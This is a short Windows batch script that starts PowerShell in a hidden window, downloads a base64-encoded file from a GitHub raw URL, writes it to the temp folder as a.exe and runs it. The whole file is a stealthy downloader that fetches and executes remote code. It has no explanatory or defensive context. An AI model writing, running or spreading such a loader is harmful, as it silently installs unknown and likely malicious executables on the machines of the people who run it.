@echo off
powershell  -windowstyle hidden -c "$p=$env:TEMP+'\a.exe'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));.\$p;"
